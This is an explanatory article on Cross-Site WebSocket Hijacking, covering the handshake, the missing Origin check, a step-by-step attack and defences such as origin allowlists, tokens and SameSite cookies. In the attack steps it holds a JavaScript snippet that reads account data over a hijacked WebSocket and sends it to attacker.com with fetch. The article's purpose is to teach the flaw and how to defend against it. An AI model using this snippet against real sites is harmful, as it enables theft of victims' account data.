Cross-Site WebSocket Hijacking Explained

Cross-Site WebSocket Hijacking (CSWSH) is a vulnerability where an attacker tricks a victim's browser into establishing an unauthorized WebSocket connection to a vulnerable application. Because WebSockets are not restricted by the Same-Origin Policy (SOP) during the handshake, an attacker can leverage the victim's existing session credentials to open a full-duplex communication channel. This article explains the mechanics of the WebSocket handshake, how attackers exploit missing origin checks to hijack connections, and how to defend against these attacks.

The WebSocket Handshake Mechanism

The WebSocket protocol initiates via an HTTP-based handshake designed to upgrade the connection from HTTP to a persistent, bidirectional WebSocket protocol. A standard handshake request sent by the browser looks like this:

GET /chat HTTP/1.1
Host: vulnerable-bank.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://vulnerable-bank.com
Cookie: session=abc123secret

If the server accepts the upgrade, it responds with an HTTP/1.1 101 Switching Protocols status code. Once complete, the HTTP connection is replaced by a continuous TCP-based WebSocket connection.

The Underlying Security Gap

Unlike standard fetch or XMLHttpRequest calls, WebSockets are not governed by the Same-Origin Policy. Browsers allow cross-origin WebSocket connections by default.

Security in the handshake is meant to be enforced via the Origin header, which the browser automatically generates and cannot be modified by client-side JavaScript. The receiving server is expected to inspect this header and reject any connection coming from an untrusted domain. When servers fail to validate the Origin header and rely solely on ambient credentials—such as HTTP cookies or HTTP basic authentication—they become vulnerable to CSWSH.

How Attackers Execute the Hijack

An attacker carries out a Cross-Site WebSocket Hijacking attack through the following sequence:

  1. Session Establishment: The victim logs into vulnerable-bank.com, receiving an authentication cookie stored in their browser.

  2. Luring the Victim: The attacker directs the victim to a malicious website (attacker.com) via phishing, malicious advertisements, or social engineering.

  3. Triggering the Cross-Origin Connection: The malicious site contains JavaScript that initiates a WebSocket connection to the target server:

    const ws = new WebSocket('wss://vulnerable-bank.com/chat');

ws.onopen = function() {
    // Request sensitive data or execute actions
    ws.send(JSON.stringify({ action: "get_account_details" }));
};

ws.onmessage = function(event) {
    // Exfiltrate stolen data to the attacker's server
    fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));
};

  4. Credential Inclusion: When the browser issues the handshake GET request, it automatically includes the victim's stored cookies for vulnerable-bank.com, while setting the Origin header to https://attacker.com.

  5. Connection Upgrade: Because the server checks only the cookie and fails to validate the Origin header, it accepts the handshake and completes the upgrade.

  6. Bi-Directional Exploitation: The attacker's script on attacker.com now has direct access to read messages sent by the server and send unauthorized messages as the victim.

Unlike traditional Cross-Site Request Forgery (CSRF), which is typically a one-way, blind transmission of commands, CSWSH provides a two-way channel. This allows the attacker to both execute state-changing actions and read confidential data in real time.

Mitigation Strategies

Defending against Cross-Site WebSocket Hijacking requires explicit validation and secure design during the handshake phase:

  • Strict Origin Header Validation: The server must maintain a strict whitelist of trusted origins and reject any handshake where the Origin header does not match, returning an HTTP 403 Forbidden status.
  • Anti-CSRF Tokens: Implement challenge tokens within the handshake request. Since custom headers cannot be added to native browser WebSocket requests, pass a unique, unpredictable token as a query parameter or inside the initial HTTP session setup.
  • SameSite Cookie Attribute: Configure session cookies with the SameSite=Strict or SameSite=Lax attribute. SameSite=Strict prevents the browser from sending cookies on cross-site requests entirely, blocking the automatic authentication required for the hijack.
